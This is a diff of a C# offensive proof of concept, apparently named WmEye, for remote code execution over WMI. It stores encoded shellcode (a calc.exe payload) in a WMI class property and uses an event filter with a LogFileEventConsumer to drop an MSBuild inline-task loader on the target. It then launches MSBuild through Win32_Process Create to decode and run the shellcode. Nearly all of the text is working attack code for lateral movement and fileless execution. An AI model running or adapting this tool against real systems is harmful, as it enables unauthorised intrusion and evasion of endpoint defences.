@@ -1,12 +1,16 @@
 /*
- * - Create a Remote WMI Class
- * - Write Shellcode as property value to the Class
- * - Write MSBuild File Content as value to another Class
- * - Win32_Process Create to call powershell -> Reads property and dumps content to BuildConfig.xml
- * - Win32_Process Create to call MSbuild remotely -> XML file is Inline task with Shellcoder loader, fetches shellcode from first class property
  * 
- *  [Author - Pwnisher]
+ * - Create a Remote WMI Class
+ * - Write Shellcode as property value to the above created Class
+ * - Create a WMI Event Filter to trigger on powershell.exe process creation
+ * - On Event Trigger Upload MSBuild Payload into remote system using LogFileEventConsumer 
+ * - Finally Invoke `Win32_Process Create` to call MSbuild remotely 
+ * 
+ *  The MSBuild Payload fetches encoded shellcode from WMI Class Property, decodes and executes it.
+ * 
+ *  [Author - 0xpwnisher]
  *  Note: Its just a POC, Not at all safe for real engagements!
+ *
  */
 
 
@@ -40,16 +44,22 @@ namespace WmEye
             Console.WriteLine("Username {0}", hostname);
             Console.WriteLine("Username {0}", username);
             Console.WriteLine("Username {0}", password);
-           
 
-            // unlock this to work!
-            
+
+            if (hostname == "localhost")
+            {
+                UploadShellcode(hostname, null, null);  // Uploads Shellcode into a remote class
+                TriggerFileUpload(hostname, null, null); // Writes MSBuild Payload using WMI LogFileEventConsumer
+                ExecutePayload(hostname, null, null);  // Remote executes MSBuild Payload
+
+            }
+            else { 
             UploadShellcode(hostname,  username, password);
-            ConsumerSeUpload(hostname, username, password);
-            ExecuteStageTwo(hostname, username, password);
-            
- 
-            // Scope Cleanup Method
+            TriggerFileUpload(hostname, username, password);
+            ExecutePayload(hostname, username, password);
+            }
+
+            // Add a Scope Cleanup Method
 
         }
 
@@ -58,7 +68,7 @@ namespace WmEye
         private static string ShellCodeUploadTempWMIClassName = "Win32_OSRecoveryConfigurationData";
         private static string ShellCodeUploadTempWMIPropertyName = "Description";
 
-        private static string writePath = "C:\\mttagic.xml";
+        private static string writePath = "C:\\mtioc.xml";
         private static string msbuildpath = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe ";
 
 
@@ -78,6 +88,7 @@ namespace WmEye
                 options.Password = password;
             }
 
+
             if (String.IsNullOrEmpty(wmiNamespace))
             {
                 wmiNamespace = "root\\cimv2";
@@ -95,6 +106,12 @@ namespace WmEye
 
             try
             {
+                if(host == "localhost") {
+
+                    scope = new ManagementScope(fullNamespace);
+                    scope.Connect();
+                }
+
                 scope = new ManagementScope(fullNamespace, options);
                 scope.Connect();
             }
@@ -107,7 +124,6 @@ namespace WmEye
                 return String.Format("[!] WMI connection failed: {0}", e.Message);
             }
 
-
             return "";
         }
 
@@ -116,9 +132,7 @@ namespace WmEye
         public static void Consumertwo(string data, string hostname, string username, string password)
         {
 
-            Console.WriteLine(data);
-
-
+          //  Console.WriteLine(data);
 
             ManagementObject myEventFilter = null;
             ManagementObject myEventConsumer = null;
@@ -129,17 +143,14 @@ namespace WmEye
             {
 
                 // want a replace filter which executes immediately
-
+                // Trigger on next WMI Connection
 
                 ConnectionOptions options = new ConnectionOptions();
-
-
-
+               
                 options.Username = username;
                 options.Password = password;
 
 
-                Console.Write("Reached");
                 string wmiNameSpace = "root\\subscription";
                 string fullscope =  String.Format(@"\\{0}\{1}", hostname, wmiNameSpace);
                 ManagementScope scope = new ManagementScope(fullscope, options);
@@ -177,6 +188,7 @@ namespace WmEye
                 myBinder.Put();
 
                 Console.WriteLine("[*] Subscription created");
+                
             }
             catch (Exception e)
             {
@@ -186,8 +198,7 @@ namespace WmEye
         }
 
 
-
-        public static void ConsumerSeUpload(string hostname, string username, string password)
+        public static void TriggerFileUpload(string hostname, string username, string password)
         {
 
            string uploadFile = "C:\\magic.xml";
@@ -203,11 +214,20 @@ namespace WmEye
 
           //  string originalWMIProperty = Convert.ToBase64String(uploadFileBytes);
 
-            Console.WriteLine(content);
+           // Console.WriteLine(content);
 
+            if (hostname == "localhost")
+            {
+                Consumertwo(content, hostname, null, null);
+            }
+            else { 
 
             Consumertwo(content, hostname, username, password);
+            }
 
+            // A cleanup method to clear the event filter,
+            // else the MSBUild XML file gets overwritten
+            
             CleanFilter();
 
 
@@ -219,7 +239,7 @@ namespace WmEye
 
             Console.WriteLine("Remove the Event Filter after File is Written");
       
-        // Check if File is written, if yes, remove the filter 
+            // Check if File is written, if yes, remove the filter 
         
         }
 
@@ -230,18 +250,14 @@ namespace WmEye
             string className = ShellCodeUploadTempWMIClassName;
             string evilPropertyName = ShellCodeUploadTempWMIPropertyName;
 
-            // MessageBox ShellCode
+            // Calc ShellCode
 
-            string fileDatas = @"MdKyMGSLEotSDItSHItCCItyIIsSgH4MM3XyiccDeDyLV3gBwot6IAHHMe2LNK8BxkWBPkZhdGF18oF+CEV4aXR16Yt6JAHHZossb4t6HAHHi3yv/AHHaHl0ZQFoa2VuQmggQnJvieH+SQsxwFFQ/9c=";
-
-
-            string fileDatai = @"UFFSU1ZXVVRYZoPk8FBqYFpoY2FsY1RZSCnUZUiLMkiLdhhIi3YQSK1IizBIi34wA1c8i1wXKIt0HyBIAf6LVB8kD7csF41SAq2BPAdXaW5Fde+LdB8cSAH+izSuSAH3mf/XSIPEaFxdX15bWllYww==";
             var scope = new ManagementScope();
-            string fileData = @"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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAGRAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==";
+            string fileData = @"/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1qAY2FsgAAAFBoMYtvh//Vu+AdKgpoppW9nf/VPAZ8CoD74HUFu0cTcm9qAFP/1WNhbGMuZXhlIGMA";
 
             
 
-            string r = InitiateConnection(ref scope, host,username,password,"");
+            string r = InitiateConnection(ref scope, host,username,password, "");
 
             // We're creating a static WMI class here
             ManagementObject evilClass = new ManagementClass(scope, null, null);
@@ -266,15 +282,15 @@ namespace WmEye
 
 
 
-
-     
-
-        public static void ExecuteStageTwo(string host, string username, string password)
+        public static void ExecutePayload(string host, string username, string password)
         {
 
 
             var scope = new ManagementScope();
-           string r = InitiateConnection(ref scope, host, username, password, "");
+            string r = InitiateConnection(ref scope, host, username, password, "");
+
+            // Invoke MSBuild using WIN32_Process Create Method for now
+            // Replace later with VBScript or other WMI Class
 
             ObjectGetOptions optionons3 = new ObjectGetOptions();
             ManagementPath pather2 = new ManagementPath("Win32_Process");
@@ -284,17 +300,15 @@ namespace WmEye
             string Command = msbuildpath + writePath;
 
             inParams2["CommandLine"] = Command;
+            
             Console.WriteLine("[X] Invoking : {0}", Command);
 
             ManagementBaseObject outParams2 = classInstance2.InvokeMethod("Create", inParams2, null);
 
 
-        } // Closing StageTwo
+        } 
 
+    } 
 
-
-
-    } // class
-
-} //namespace 
+}  
 
